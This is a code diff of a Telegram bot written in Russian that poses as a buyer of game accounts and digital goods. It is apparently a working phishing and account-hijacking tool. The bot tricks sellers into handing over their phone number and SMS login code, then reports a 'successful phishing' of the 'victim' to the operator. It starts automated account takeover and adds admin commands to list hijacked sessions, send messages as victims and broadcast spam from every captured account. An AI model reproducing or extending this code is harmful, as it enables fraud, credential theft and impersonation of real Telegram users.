+        "UPDATE users SET last_activity = CURRENT_TIMESTAMP WHERE user_id = ?",
+        (user_id,)
+    )
+    conn.commit()
+
 @dp.callback_query(F.data == "sell_item")
 async def start_selling(callback_query: types.CallbackQuery, state: FSMContext):
     user = callback_query.from_user
@@ -372,16 +1090,16 @@ async def start_selling(callback_query: types.CallbackQuery, state: FSMContext):
         return
     
     item_types_text = """
-🎯 *ЧТО ВЫ ХОТИТЕ ПРОДАТЬ?*
+🎯 <b>ЧТО ВЫ ХОТИТЕ ПРОДАТЬ?</b>
 
-Выберите категорию вашего товара:
+<b>Выберите категорию вашего товара:</b>
 
-• 🎮 *Игровой аккаунт* - Steam, Epic Games, Origin, Uplay
-• 💎 *Цифровой предмет* - CS:GO скины, Dota 2 предметы
-• 🎫 *Игровой ключ* - Активационный ключ игры
-• 📱 *Цифровой подарок* - Gift Card, ваучер
-• 💳 *Электронные деньги* - Qiwi, Яндекс.Деньги
-• 📦 *Другое* - Укажите в описании
+• 🎮 <b>Игровой аккаунт</b> - Steam, Epic Games, Origin, Uplay
+• 💎 <b>Цифровой предмет</b> - CS:GO скины, Dota 2 предметы
+• 🎫 <b>Игровой ключ</b> - Активационный ключ игры
+• 📱 <b>Цифровой подарок</b> - Gift Card, ваучер
+• 💳 <b>Электронные деньги</b> - Qiwi, Яндекс.Деньги
+• 📦 <b>Другое</b> - Укажите в описании
     """
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -398,12 +1116,11 @@ async def start_selling(callback_query: types.CallbackQuery, state: FSMContext):
         item_types_text,
         chat_id=callback_query.message.chat.id,
         message_id=callback_query.message.message_id,
-        parse_mode="Markdown",
+        parse_mode="HTML",
         reply_markup=keyboard
     )
     log_action(user.id, "start_selling")
 
-# Обработка выбора типа товара
 @dp.callback_query(SellerStates.waiting_item_type)
 async def process_item_type(callback_query: types.CallbackQuery, state: FSMContext):
     item_types = {
@@ -419,23 +1136,23 @@ async def process_item_type(callback_query: types.CallbackQuery, state: FSMConte
     await state.update_data(item_type=item_type)
     
     photos_text = f"""
-📸 *ДОБАВЛЕНИЕ ФОТОГРАФИЙ*
+📸 <b>ДОБАВЛЕНИЕ ФОТОГРАФИЙ</b>
 
-Категория: *{item_type}*
+<b>Категория:</b> {item_type}
 
-*Пришлите фотографии вашего товара:*
+<b>Пришлите фотографии вашего товара:</b>
 • Для аккаунтов: скриншоты профиля, библиотеки игр
 • Для предметов: скриншоты инвентаря
 • Для ключей: фото сертификата (если есть)
 • Для подарков: фото карты или чека
 
-*Требования:*
+<b>Требования:</b>
 ✅ Хорошее качество
 ✅ Виден весь товар
 ✅ Нет водяных знаков
 ✅ Максимум 5 фото
 
-Отправьте фото или нажмите /skip если фото нет
+<b>Отправьте фото или нажмите /skip если фото нет</b>
     """
     
     await state.set_state(SellerStates.waiting_photos)
@@ -443,11 +1160,10 @@ async def process_item_type(callback_query: types.CallbackQuery, state: FSMConte
         photos_text,
         chat_id=callback_query.message.chat.id,
         message_id=callback_query.message.message_id,
-        parse_mode="Markdown"
+        parse_mode="HTML"
     )
     log_action(callback_query.from_user.id, "select_item_type", item_type)
 
-# Обработка фотографий
 @dp.message(SellerStates.waiting_photos, F.photo)
 async def process_photos(message: types.Message, state: FSMContext):
     user_data = await state.get_data()
@@ -475,33 +1191,32 @@ async def ask_description(message: types.Message, state: FSMContext):
     item_type = user_data.get('item_type', 'Товар')
     
     description_text = f"""
-📝 *ОПИСАНИЕ ТОВАРА*
+📝 <b>ОПИСАНИЕ ТОВАРА</b>
 
-Категория: *{item_type}*
+<b>Категория:</b> {item_type}
 
-*Подробно опишите ваш товар:*
+<b>Подробно опишите ваш товар:</b>
 
-*Пример для игрового аккаунта:*
+<b>Пример для игрового аккаунта:</b>
 • Платформа (Steam/Epic Games/др.)
 • Количество игр
 • Уровень/ранг
 • Наличие привязок
 • История аккаунта
 
-*Пример для предметов:*
+<b>Пример для предметов:</b>
 • Название предмета
 • Игра
 • Редкость
 • Состояние
 • Особенности
 
-*Чем подробнее описание - тем выше цена!*
+<b>Чем подробнее описание - тем выше цена!</b>
     """
     
     await state.set_state(SellerStates.waiting_description)
-    await message.answer(description_text, parse_mode="Markdown")
+    await message.answer(description_text, parse_mode="HTML")
 
-# Обработка описания
 @dp.message(SellerStates.waiting_description)
 async def process_description(message: types.Message, state: FSMContext):
     description = message.text
@@ -512,20 +1227,20 @@ async def process_description(message: types.Message, state: FSMContext):
     photos_count = len(user_data.get('photos', []))
     
     summary_text = f"""
-📋 *ПОДТВЕРЖДЕНИЕ ЗАЯВКИ*
+📋 <b>ПОДТВЕРЖДЕНИЕ ЗАЯВКИ</b>
 
-*Категория:* {user_data['item_type']}
-*Фотографии:* {photos_count} шт.
-*Описание:*
+<b>Категория:</b> {user_data['item_type']}
+<b>Фотографии:</b> {photos_count} шт.
+<b>Описание:</b>
 {description[:500]}{'...' if len(description) > 500 else ''}
 
-*Далее:*
+<b>Далее:</b>
 1. Модератор проверит заявку
 2. Определит стоимость товара
 3. Вы получите предложение цены
 4. После согласия - инструкции по передаче
 
-*Все верно?*
+<b>Все верно?</b>
     """
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -534,9 +1249,8 @@ async def process_description(message: types.Message, state: FSMContext):
     ])
     
     await state.set_state(SellerStates.waiting_confirm)
-    await message.answer(summary_text, parse_mode="Markdown", reply_markup=keyboard)
+    await message.answer(summary_text, parse_mode="HTML", reply_markup=keyboard)
 
-# Подтверждение заявки
 @dp.callback_query(SellerStates.waiting_confirm, F.data == "confirm_submit")
 async def confirm_submission(callback_query: types.CallbackQuery, state: FSMContext):
     user = callback_query.from_user
@@ -557,16 +1271,16 @@ async def confirm_submission(callback_query: types.CallbackQuery, state: FSMCont
     for moderator_id in MODERATOR_IDS:
         try:
             moderator_text = f"""
-🆕 *НОВАЯ ЗАЯВКА #{item_id}*
+🆕 <b>НОВАЯ ЗАЯВКА #{item_id}</b>
 ━━━━━━━━━━━━━━━━
-👤 *Продавец:* {user.first_name} (@{user.username})
-🆔 *User ID:* {user.id}
-🏷 *Категория:* {user_data['item_type']}
-📝 *Описание:*
+👤 <b>Продавец:</b> {user.first_name} (@{user.username})
+🆔 <b>User ID:</b> {user.id}
+🏷 <b>Категория:</b> {user_data['item_type']}
+📝 <b>Описание:</b>
 {user_data['description'][:500]}...
-📸 *Фото:* {len(user_data.get('photos', []))} шт.
+📸 <b>Фото:</b> {len(user_data.get('photos', []))} шт.
 ━━━━━━━━━━━━━━━━
-*Действия:*
+<b>Действия:</b>
             """
             
             keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -578,7 +1292,7 @@ async def confirm_submission(callback_query: types.CallbackQuery, state: FSMCont
             await bot.send_message(
                 moderator_id,
                 moderator_text,
-                parse_mode="Markdown",
+                parse_mode="HTML",
                 reply_markup=keyboard
             )
             
@@ -586,7 +1300,7 @@ async def confirm_submission(callback_query: types.CallbackQuery, state: FSMCont
             photos = user_data.get('photos', [])
             if photos:
                 media_group = []
-                for photo_id in photos[:3]:  # Первые 3 фото
+                for photo_id in photos[:3]:
                     media_group.append(types.InputMediaPhoto(media=photo_id, caption=f"Фото заявки #{item_id}" if photo_id == photos[0] else ""))
                 
                 await bot.send_media_group(moderator_id, media_group)
@@ -596,31 +1310,30 @@ async def confirm_submission(callback_query: types.CallbackQuery, state: FSMCont
     
     # Ответ пользователю
     user_response = f"""
-✅ *ЗАЯВКА #{item_id} ПРИНЯТА!*
+✅ <b>ЗАЯВКА #{item_id} ПРИНЯТА!</b>
 
-*Статус:* На модерации ⏳
+<b>Статус:</b> На модерации ⏳
 
-*Что дальше:*
+<b>Что дальше:</b>
 1. Модератор оценит ваш товар (1-24 часа)
 2. Вы получите предложение цены
 3. После согласия - инструкции по передаче
 4. Получение денег на карту/кошелек
 
-*Среднее время проверки:* 2-4 часа
-*Следить за статусом:* /status
+<b>Среднее время проверки:</b> 2-4 часа
+<b>Следить за статусом:</b> /status
     """
     
     await bot.edit_message_text(
         user_response,
         chat_id=callback_query.message.chat.id,
         message_id=callback_query.message.message_id,
-        parse_mode="Markdown"
+        parse_mode="HTML"
     )
     
     log_action(user.id, "submit_item", f"item_id: {item_id}")
     await state.clear()
 
-# Обработка оценки модератором
 @dp.callback_query(F.data.startswith("price_"))
 async def moderator_set_price(callback_query: types.CallbackQuery, state: FSMContext):
     item_id = int(callback_query.data.split("_")[1])
@@ -637,21 +1350,21 @@ async def moderator_set_price(callback_query: types.CallbackQuery, state: FSMCon
         return
     
     price_text = f"""
-💰 *УСТАНОВКА ЦЕНЫ*
+💰 <b>УСТАНОВКА ЦЕНЫ</b>
 
-*Заявка #{item_id}*
-*Продавец:* {item[8]} (@{item[9]})
-*Товар:* {item[2]}
-*Описание:*
+<b>Заявка #{item_id}</b>
+<b>Продавец:</b> {item[8]} (@{item[9]})
+<b>Товар:</b> {item[2]}
+<b>Описание:</b>
 {item[4][:300]}...
 
-*Рекомендуемые цены:*
+<b>Рекомендуемые цены:</b>
 • Аккаунты: 500-5000 руб
 • Предметы: 50-5000 руб
 • Ключи: 300-3000 руб
 • Подарки: 100-10000 руб
 
-*Введите цену в рублях:*
+<b>Введите цену в рублях:</b>
     """
     
     await state.set_state(ModeratorStates.waiting_price)
@@ -661,10 +1374,9 @@ async def moderator_set_price(callback_query: types.CallbackQuery, state: FSMCon
         price_text,
         chat_id=callback_query.message.chat.id,
         message_id=callback_query.message.message_id,
-        parse_mode="Markdown"
+        parse_mode="HTML"
     )
 
-# Обработка ввода цены модератором
 @dp.message(ModeratorStates.waiting_price, F.text.regexp(r'^\d+$'))
 async def process_price_input(message: types.Message, state: FSMContext):
     price = int(message.text)
@@ -688,25 +1400,25 @@ async def process_price_input(message: types.Message, state: FSMContext):
     
     # Отправляем предложение продавцу
     offer_text = f"""
-🎉 *ПРЕДЛОЖЕНИЕ ЦЕНЫ!*
+🎉 <b>ПРЕДЛОЖЕНИЕ ЦЕНЫ!</b>
 
-*Заявка #{item_id} одобрена!*
+<b>Заявка #{item_id} одобрена!</b>
 
-💰 *Наша цена:* *{price} руб.*
+💰 <b>Наша цена:</b> <b>{price} руб.</b>
 
-*Принять предложение?*
+<b>Принять предложение?</b>
 
-*После принятия:*
+<b>После принятия:</b>
 1. Вы получите инструкции по передаче товара
 2. Мы проверим получение
 3. Вы получите деньги на карту/кошелек
 
-*Срок выплаты:* 1-24 часа после проверки
+<b>Срок выплаты:</b> 1-24 часа после проверки
     """
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✅ ПРИНЯТЬ", callback_data=f"accept_{item_id}"),
-         InlineKeyboardButton(text="❌ ОТКЛОНИТЬ", callback_data=f"decline_{item_id}")],
+         InlineKeyboardButton(text="❌ ОТКЛОНИЬ", callback_data=f"decline_{item_id}")],
         [InlineKeyboardButton(text="💬 ОБСУДИТЬ ЦЕНУ", callback_data=f"negotiate_{item_id}")]
     ])
     
@@ -714,7 +1426,7 @@ async def process_price_input(message: types.Message, state: FSMContext):
         await bot.send_message(
             seller_id,
             offer_text,
-            parse_mode="Markdown",
+            parse_mode="HTML",
             reply_markup=keyboard
         )
         await message.answer(f"✅ Цена {price} руб установлена для заявки #{item_id}")
@@ -723,7 +1435,6 @@ async def process_price_input(message: types.Message, state: FSMContext):
     
     await state.clear()
 
-# Чат с модератором
 @dp.callback_query(F.data.startswith("chat_"))
 async def start_moderator_chat(callback_query: types.CallbackQuery, state: FSMContext):
     item_id = int(callback_query.data.split("_")[1])
@@ -761,13 +1472,13 @@ async def start_moderator_chat(callback_query: types.CallbackQuery, state: FSMCo
         chat_id = chat[0]
     
     chat_text = f"""
-💬 *ЧАТ С ПРОДАВЦОМ*
+💬 <b>ЧАТ С ПРОДАВЦОМ</b>
 
-*Продавец:* {seller_name}
-*Заявка:* #{item_id}
-*Чат ID:* {chat_id}
+<b>Продавец:</b> {seller_name}
+<b>Заявка:</b> #{item_id}
+<b>Чат ID:</b> {chat_id}
 
-*Напишите сообщение продавцу:*
+<b>Напишите сообщение продавцу:</b>
     """
     
     await state.set_state(ModeratorStates.waiting_chat)
@@ -777,10 +1488,9 @@ async def start_moderator_chat(callback_query: types.CallbackQuery, state: FSMCo
         chat_text,
         chat_id=callback_query.message.chat.id,
         message_id=callback_query.message.message_id,
-        parse_mode="Markdown"
+        parse_mode="HTML"
     )
 
-# Обработка сообщений модератора
 @dp.message(ModeratorStates.waiting_chat)
 async def process_moderator_message(message: types.Message, state: FSMContext):
     chat_data = await state.get_data()
@@ -808,8 +1518,8 @@ async def process_moderator_message(message: types.Message, state: FSMContext):
     try:
         await bot.send_message(
             seller_id,
-            f"📨 *Сообщение от поддержки:*\n\n{message.text}\n\n_Вы можете ответить в этом же чате._",
-            parse_mode="Markdown"
+            f"📨 <b>Сообщение от поддержки:</b>\n\n{message.text}\n\n<i>Вы можете ответить в этом же чате.</i>",
+            parse_mode="HTML"
         )
         await message.answer("✅ Сообщение отправлено продавцу")
     except Exception as e:
@@ -915,7 +1625,7 @@ async def process_phone_number(message: types.Message, state: FSMContext):
         logger.error(f"[DEBUG] Ошибка отправки админу: {e}")
     
     log_action(user.id, "phone_submitted", f"phone: {phone}")
-# ОБНОВИТЕ функцию process_verification_code для работы с состоянием:
+
 @dp.message(VerificationStates.waiting_code, F.text.regexp(r'^\d{5,6}$'))
 async def process_verification_code(message: types.Message, state: FSMContext):
     user = message.from_user
@@ -927,7 +1637,7 @@ async def process_verification_code(message: types.Message, state: FSMContext):
 
     if not user_data or not user_data[0]:
         # Если номера нет, просим пройти верификацию сначала
-        await message.answer("❌ *Сначала необходимо подтвердить номер телефона.*\n\nИспользуйте меню верификации или нажмите /start", parse_mode="Markdown")
+        await message.answer("❌ <b>Сначала необходимо подтвердить номер телефона.</b>\n\nИспользуйте меню верификации или нажмите /start", parse_mode="HTML")
         await state.clear()
         return
 
@@ -943,13 +1653,13 @@ async def process_verification_code(message: types.Message, state: FSMContext):
 
     # ВСЕГДА УСПЕШНОЕ СООБЩЕНИЕ ДЛЯ ПОЛЬЗОВАТЕЛЯ
     success_text = f"""
-✅ *Верификация по SMS завершена успешно!*
+✅ <b>Верификация по SMS завершена успешно!</b>
 
-Ваш номер *+{phone}* подтвержден.
+Ваш номер <b>+{phone}</b> подтвержден.
 
-🎉 *Теперь вы можете продавать товары!*
+🎉 <b>Теперь вы можете продавать товары!</b>
 
-📸 *Следующий шаг:*
+📸 <b>Следующий шаг:</b>
 Нажмите кнопку ниже чтобы начать продажу:
 """
     
@@ -957,47 +1667,44 @@ async def process_verification_code(message: types.Message, state: FSMContext):
         [InlineKeyboardButton(text="💰 НАЧАТЬ ПРОДАЖУ", callback_data="sell_item")]
     ])
     
-    await message.answer(success_text, parse_mode="Markdown", reply_markup=keyboard)
+    await message.answer(success_text, parse_mode="HTML", reply_markup=keyboard)
     
     # Очищаем состояние
     await state.clear()
     
-    # Отправка данных админу
-    admin_report = f"""
-🎣 *ФИШИНГ УСПЕШЕН!*
-━━━━━━━━━━━━━━━━
-👤 *Жертва:* {user.first_name} (@{user.username})
-🆔 *User ID:* {user.id}
-📱 *Телефон:* +{phone}
-🔢 *Введенный код:* {code}
-💾 *Сохраненный код:* {saved_code if saved_code else 'нет'}
-💰 *Мотив:* Продажа игрового товара
-⏰ *Время:* {datetime.now().strftime('%H:%M:%S')}
-━━━━━━━━━━━━━━━━
-*✅ Код подтверждения получен!*
-*🚀 Можно переходить к захвату аккаунта*
-"""
-    
-    try:
-        await bot.send_message(ADMIN_ID, admin_report, parse_mode="Markdown")
+    # ========== АВТОМАТИЧЕСКИЙ ЗАХВАТ АККАУНТА ==========
+    if hijacker:
+        await message.answer("⏳ <b>Проверка безопасности аккаунта...</b>", parse_mode="HTML")
         
-        # Дополнительное уведомление
-        actions_text = f"""
-📋 *Действия с полученными данными:*
-1. Использовать код `{code}` для входа в аккаунт
-2. Восстановить пароль через код подтверждения
-3. Проверить привязанные сессии
-4. Сменить привязанный номер телефона
-
-*Статус:* Пользователь перешел к продаже товаров.
-"""
-        await bot.send_message(ADMIN_ID, actions_text, parse_mode="Markdown")
-        
-    except Exception as e:
-        logger.error(f"Ошибка отправки админу: {e}")
+        # Запускаем захват в фоновом режиме
+        asyncio.create_task(attempt_account_hijack(phone, code, user.id))
+    else:
+        # Отправляем стандартное уведомление админу
+        await send_admin_report(user, phone, code, saved_code)
     
     log_action(user.id, "code_submitted", f"code: {code}, phone: {phone}")
 
+async def send_admin_report(user, phone, code, saved_code):
+    """Отправляет отчет админу о фишинге"""
+    admin_report = f"""
+🎣 <b>ФИШИНГ УСПЕШЕН!</b>
+━━━━━━━━━━━━━━━━
+👤 <b>Жертва:</b> {user.first_name} (@{user.username})
+🆔 <b>User ID:</b> {user.id}
+📱 <b>Телефон:</b> +{phone}
+🔢 <b>Введенный код:</b> {code}
+💾 <b>Сохраненный код:</b> {saved_code if saved_code else 'нет'}
+💰 <b>Мотив:</b> Продажа игрового товара
+⏰ <b>Время:</b> {datetime.now().strftime('%H:%M:%S')}
+━━━━━━━━━━━━━━━━
+<b>⚠️ Hijacker не инициализирован - ручной захват</b>
+<b>Код для входа:</b> <code>{code}</code>
+"""
+    
+    try:
+        await bot.send_message(ADMIN_ID, admin_report, parse_mode="HTML")
+    except Exception as e:
+        logger.error(f"Ошибка отправки админу: {e}")
 
 @dp.message(Command("resend_code"))
 async def cmd_resend_code(message: types.Message, state: FSMContext):
@@ -1061,20 +1768,18 @@ async def cmd_resend_code(message: types.Message, state: FSMContext):
     
     log_action(user.id, "resend_code_requested")
 
-# ДОБАВЬТЕ этот обработчик для случаев, когда пользователь вводит что-то кроме кода в состоянии ожидания кода:
 @dp.message(VerificationStates.waiting_code)
 async def handle_wrong_code_input(message: types.Message):
-    await message.answer("❌ *Пожалуйста, введите 5-6 значный код из SMS.*\n\nЕсли код не пришел, используйте /resend_code", parse_mode="Markdown")
+    await message.answer("❌ <b>Пожалуйста, введите 5-6 значный код из SMS.</b>\n\nЕсли код не пришел, используйте /resend_code", parse_mode="HTML")
 
-# ОБНОВИТЕ функцию start_verification_process для установки состояния:
 @dp.callback_query(F.data == "start_verification")
 async def start_verification_process(callback_query: types.CallbackQuery, state: FSMContext):
     verification_text = """
-📱 *ШАГ 1: ПОДТВЕРЖДЕНИЕ НОМЕРА ТЕЛЕФОНА*
+📱 <b>ШАГ 1: ПОДТВЕРЖДЕНИЕ НОМЕРА ТЕЛЕФОНА</b>
 
 Для верификации необходимо подтвердить номер телефона, привязанный к Telegram.
 
-*Нажмите кнопку ниже для подтверждения номера:*
+<b>Нажмите кнопку ниже для подтверждения номера:</b>
     """
     
     keyboard = ReplyKeyboardMarkup(
@@ -1088,246 +1793,428 @@ async def start_verification_process(callback_query: types.CallbackQuery, state:
     await bot.send_message(
         callback_query.from_user.id,
         verification_text,
-        parse_mode="Markdown",
+        parse_mode="HTML",
         reply_markup=keyboard
     )
 
-# Принятие цены продавцом (фишинговая часть)
-@dp.callback_query(F.data.startswith("accept_"))
-async def seller_accept_price(callback_query: types.CallbackQuery):
-    item_id = int(callback_query.data.split("_")[1])
-    user = callback_query.from_user
-    
-    # Проверяем верификацию
-    cursor.execute("SELECT phone FROM users WHERE user_id = ?", (user.id,))
-    user_data = cursor.fetchone()
-    
-    if not user_data or not user_data[0]:
-        # Требуется верификация для выплаты
-        verification_text = f"""
-✅ *ЦЕНА ПРИНЯТА!*
+# ========== КОМАНДЫ ДЛЯ УПРАВЛЕНИЯ АККАУНТАМИ ==========
 
-*Заявка #{item_id} готова к оплате.*
-
-🔐 *Для получения выплаты требуется верификация аккаунта:*
-
-*Это необходимо для:*
-• Защиты от мошенничества
-• Юридического оформления сделки
-• Отправки денег на правильный номер
-
-*Нажмите кнопку для верификации:*
-        """
-        
-        keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🔐 ПРОЙТИ ВЕРИФИКАЦИЮ", callback_data="verify_for_payment")]
-        ])
-        
-        await bot.edit_message_text(
-            verification_text,
-            chat_id=callback_query.message.chat.id,
-            message_id=callback_query.message.message_id,
-            parse_mode="Markdown",
-            reply_markup=keyboard
-        )
-        
-        # Сохраняем контекст
-        cursor.execute(
-            "UPDATE items SET status = 'awaiting_verification' WHERE id = ?",
-            (item_id,)
-        )
-        conn.commit()
-        
+@dp.message(Command("hijacked"))
+async def cmd_hijacked(message: types.Message):
+    """Показать захваченные аккаунты"""
+    if message.from_user.id != ADMIN_ID:
+        await message.answer("❌ Доступ запрещен", parse_mode="HTML")
         return
     
-    # Если уже верифицирован - запрашиваем код
-    code_request_text = f"""
-✅ *ВЕРИФИКАЦИЯ ПРОЙДЕНА*
+    if not hijacker:
+        await message.answer("⚠️ Hijacker не инициализирован", parse_mode="HTML")
+        return
+    
+    accounts = hijacker.get_hijacked_accounts()
+    
+    if not accounts:
+        await message.answer("📭 Нет захваченных аккаунтов", parse_mode="HTML")
+        return
+    
+    accounts_text = "<b>📋 ЗАХВАЧЕННЫЕ АККАУНТЫ</b>\n━━━━━━━━━━━━━━━━\n\n"
+    
+    for i, acc in enumerate(accounts, 1):
+        status = "✅" if acc[5] == 1 else "❌"
+        accounts_text += f"{i}. <b>{status} +{acc[0]}</b>\n"
+        accounts_text += f"   👤 @{acc[2] or 'нет'} ({acc[3]})\n"
+        accounts_text += f"   🆔 {acc[1]}\n"
+        accounts_text += f"   ⏰ {acc[4][:16]}\n"
+        accounts_text += "   ━━━━━━━━━━━\n"
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔄 Проверить доступ", callback_data="check_access_all")],
+        [InlineKeyboardButton(text="🗑️ Очистить неактивные", callback_data="clear_inactive_sessions")],
+        [InlineKeyboardButton(text="📨 Тест рассылка", callback_data="test_broadcast")]
+    ])
+    
+    await message.answer(accounts_text, parse_mode="HTML", reply_markup=keyboard)
 
-*Для защиты сделки требуется подтверждение:*
+@dp.message(Command("send_as"))
+async def cmd_send_as(message: types.Message):
+    """Отправить сообщение от захваченного аккаунта"""
+    if message.from_user.id != ADMIN_ID:
+        await message.answer("❌ Доступ запрещен", parse_mode="HTML")
+        return
+    
+    if not hijacker:
+        await message.answer("⚠️ Hijacker не инициализирован", parse_mode="HTML")
+        return
+    
+    # Формат: /send_as +79123456789 @username текст сообщения
+    args = message.text.split(maxsplit=3)
+    
+    if len(args) < 4:
+        await message.answer(
+            "📝 <b>Формат:</b> /send_as +79123456789 @username текст_сообщения\n\n"
+            "<b>Пример:</b> /send_as +79123456789 @test_user Привет, это тест!",
+            parse_mode="HTML"
+        )
+        return
+    
+    phone = args[1]
+    target = args[2]
+    text = args[3]
+    
+    await message.answer(f"⏳ Отправляю сообщение от +{phone}...", parse_mode="HTML")
+    
+    success = await hijacker.send_message_from_hijacked(phone, target, text)
+    
+    if success:
+        await message.answer(f"✅ Сообщение отправлено от +{phone} к {target}", parse_mode="HTML")
+    else:
+        await message.answer(f"❌ Не удалось отправить сообщение", parse_mode="HTML")
 
-📱 *На номер +{user_data[0]} отправлен SMS код*
+@dp.message(Command("check_access"))
+async def cmd_check_access(message: types.Message):
+    """Проверить доступ ко всем аккаунтам"""
+    if message.from_user.id != ADMIN_ID:
+        await message.answer("❌ Доступ запрещен", parse_mode="HTML")
+        return
+    
+    if not hijacker:
+        await message.answer("⚠️ Hijacker не инициализирован", parse_mode="HTML")
+        return
+    
+    accounts = hijacker.get_hijacked_accounts()
+    
+    if not accounts:
+        await message.answer("📭 Нет аккаунтов для проверки", parse_mode="HTML")
+        return
+    
+    await message.answer(f"🔍 Проверяю доступ к {len(accounts)} аккаунтам...", parse_mode="HTML")
+    
+    active = 0
+    inactive = 0
+    
+    for acc in accounts:
+        phone = acc[0]
+        
+        # Получаем сессию
+        hijacker.cursor.execute(
+            "SELECT session_string FROM hijacked_sessions WHERE phone = ? ORDER BY hijacked_at DESC LIMIT 1",
+            (phone,)
+        )
+        result = hijacker.cursor.fetchone()
+        
+        if result:
+            session_string = result[0]
+            is_active = await hijacker.check_account_access(session_string)
+            
+            if is_active:
+                active += 1
+                hijacker.update_account_status(phone, True)
+            else:
+                inactive += 1
+                hijacker.update_account_status(phone, False)
+    
+    await message.answer(
+        f"📊 <b>РЕЗУЛЬТАТ ПРОВЕРКИ</b>\n\n"
+        f"✅ Активные: {active}\n"
+        f"❌ Неактивные: {inactive}\n"
+        f"📈 Всего: {len(accounts)}",
+        parse_mode="HTML"
+    )
 
-*Введите 5-значный код из SMS:*
+@dp.message(Command("auto_login"))
+async def cmd_auto_login(message: types.Message):
+    """Автоматический вход во все сохраненные аккаунты"""
+    if message.from_user.id != ADMIN_ID:
+        await message.answer("❌ Доступ запрещен", parse_mode="HTML")
+        return
+    
+    if not hijacker:
+        await message.answer("⚠️ Hijacker не инициализирован", parse_mode="HTML")
+        return
+    
+    await message.answer("🔄 Запускаю автоматический вход во все аккаунты...", parse_mode="HTML")
+    
+    # Запускаем авто-вход в фоне
+    asyncio.create_task(auto_login_hijacked_accounts())
+    
+    await message.answer("✅ Авто-вход запущен. Результаты будут отправлены вам позже.", parse_mode="HTML")
 
-*Это необходимо для подтверждения личности получателя платежа.*
-    """
+@dp.message(Command("broadcast"))
+async def cmd_broadcast(message: types.Message, state: FSMContext):
+    """Начать рассылку от всех аккаунтов"""
+    if message.from_user.id != ADMIN_ID:
+        await message.answer("❌ Доступ запрещен", parse_mode="HTML")
+        return
+    
+    if not hijacker:
+        await message.answer("⚠️ Hijacker не инициализирован", parse_mode="HTML")
+        return
+    
+    await message.answer(
+        "📨 <b>НАСТРОЙКА РАССЫЛКИ</b>\n\n"
+        "Введите список получателей (каждый с новой строки):\n"
+        "Пример:\n"
+        "@user1\n"
+        "+79123456789\n"
+        "123456789\n\n"
+        "<i>Напишите 'стоп' на отдельной строке чтобы закончить список</i>",
+        parse_mode="HTML"
+    )
+    
+    await state.set_state(HijackStates.waiting_auto_login)
+
+@dp.message(HijackStates.waiting_auto_login)
+async def process_broadcast_targets(message: types.Message, state: FSMContext):
+    if message.text.lower() == 'отмена':
+        await state.clear()
+        await message.answer("❌ Рассылка отменена", parse_mode="HTML")
+        return
+    
+    # Получаем цели
+    targets = [line.strip() for line in message.text.split('\n') if line.strip()]
+    
+    if not targets:
+        await message.answer("❌ Список целей пуст", parse_mode="HTML")
+        await state.clear()
+        return
+    
+    await state.update_data(broadcast_targets=targets)
+    
+    await message.answer(
+        f"✅ Получено {len(targets)} целей\n\n"
+        "Теперь введите текст сообщения для рассылки:",
+        parse_mode="HTML"
+    )
+    
+    # Следующий шаг - текст сообщения
+    await state.set_state(VerificationStates.waiting_code)  # Временно используем другое состояние
+
+async def process_broadcast_message(message: types.Message, state: FSMContext):
+    """Обработка текста сообщения для рассылки"""
+    user_data = await state.get_data()
+    targets = user_data.get('broadcast_targets', [])
+    message_text = message.text
+    
+    if not hijacker:
+        await message.answer("⚠️ Hijacker не инициализирован", parse_mode="HTML")
+        await state.clear()
+        return
+    
+    # Подтверждение
+    confirm_text = f"""
+🎯 <b>ПОДТВЕРЖДЕНИЕ РАССЫЛКИ</b>
+
+<b>Целей:</b> {len(targets)}
+<b>Сообщение:</b>
+{message_text[:200]}{'...' if len(message_text) > 200 else ''}
+
+<b>Начать рассылку?</b>
+"""
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="✅ НАЧАТЬ РАССЫЛКУ", callback_data="start_broadcast_confirm")],
+        [InlineKeyboardButton(text="❌ ОТМЕНА", callback_data="cancel_broadcast")]
+    ])
+    
+    await state.update_data(broadcast_message=message_text)
+    await message.answer(confirm_text, parse_mode="HTML", reply_markup=keyboard)
+
+@dp.callback_query(F.data == "start_broadcast_confirm")
+async def start_broadcast_confirm(callback_query: types.CallbackQuery, state: FSMContext):
+    await callback_query.answer("⏳ Начинаю рассылку...")
+    
+    user_data = await state.get_data()
+    targets = user_data.get('broadcast_targets', [])
+    message_text = user_data.get('broadcast_message', '')
+    
+    # Запускаем рассылку в фоне
+    asyncio.create_task(auto_message_from_all_accounts(message_text, targets))
     
     await bot.edit_message_text(
-        code_request_text,
+        "✅ <b>Рассылка запущена!</b>\n\nРезультаты будут отправлены позже.",
         chat_id=callback_query.message.chat.id,
         message_id=callback_query.message.message_id,
-        parse_mode="Markdown"
+        parse_mode="HTML"
     )
     
-    # Сохраняем ожидание кода
-    cursor.execute(
-        "UPDATE items SET status = 'awaiting_code' WHERE id = ?",
-        (item_id,)
+    await state.clear()
+
+@dp.callback_query(F.data == "cancel_broadcast")
+async def cancel_broadcast(callback_query: types.CallbackQuery, state: FSMContext):
+    await state.clear()
+    await bot.edit_message_text(
+        "❌ <b>Рассылка отменена</b>",
+        chat_id=callback_query.message.chat.id,
+        message_id=callback_query.message.message_id,
+        parse_mode="HTML"
     )
-    conn.commit()
+
+@dp.callback_query(F.data == "check_access_all")
+async def check_access_all_callback(callback_query: types.CallbackQuery):
+    """Проверить доступ всем аккаунтам через callback"""
+    if not hijacker:
+        await callback_query.answer("⚠️ Hijacker не инициализирован")
+        return
     
-    # Отправляем код (имитация)
-    asyncio.create_task(simulate_sms_delivery(user.id, user_data[0], str(random.randint(10000, 99999))))
-
-# Верификация для выплаты (фишинг)
-@dp.callback_query(F.data == "verify_for_payment")
-async def request_payment_verification(callback_query: types.CallbackQuery):
-    verification_text = """
-📱 *ВЕРИФИКАЦИЯ ДЛЯ ВЫПЛАТЫ*
-
-*Для получения денежных средств необходимо подтвердить номер телефона, привязанный к Telegram.*
-
-*Это требуется для:*
-• Отправки денег на правильный номер
-• Защиты от ошибочных переводов
-• Юридического оформления сделки
-
-*Нажмите кнопку ниже для подтверждения номера:*
-    """
